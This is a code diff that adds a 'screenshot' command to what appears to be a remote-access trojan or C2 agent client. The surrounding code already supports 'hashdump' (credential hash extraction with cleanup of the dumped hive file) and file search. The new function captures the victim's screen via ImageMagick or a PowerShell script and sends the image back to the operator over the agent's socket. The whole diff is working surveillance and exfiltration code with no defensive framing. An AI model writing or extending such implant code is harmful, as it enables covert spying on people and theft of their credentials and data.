@@ -78,6 +78,9 @@ class AgentClient:
         elif cmd == "hashdump":
             self._hashdump()
 
+        elif cmd == "screenshot":
+            self._screenshot()
+
         elif cmd.startswith("search "):
             self._search_file(cmd)
 
@@ -179,6 +182,31 @@ class AgentClient:
                 subprocess.run(["cmd.exe", "/C", r"del system.save"])
         except Exception as e:
             logger.debug("[agent] Error in hashdump %s", e)
+
+    def _screenshot(self):
+        import subprocess, platform
+
+        try:
+            if platform.system() == "Linux":
+                subprocess.run(["import", "-window", "root", "screenshot.png"])
+            elif platform.system() == "Windows":
+                ps_script = r"""
+                Add-Type -AssemblyName System.Windows.Forms
+                Add-Type -AssemblyName System.Drawing
+                $b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+                $i=New-Object System.Drawing.Bitmap $b.Width,$b.Height
+                $g=[System.Drawing.Graphics]::FromImage($i)
+                $g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size)
+                $i.Save("$pwd\screenshot.png")
+                """
+
+                subprocess.run(["powershell", "-NoProfile", "-Command", ps_script], check=True)
+            else:
+                logger.debug("[agent] Unsupported OS")
+
+            FileUtils.send_file(self.sock, "screenshot.png")
+        except Exception as e:
+            logger.debug("[agent] Error in screenshot %s", e)
 
     def close(self):
         self.running = False
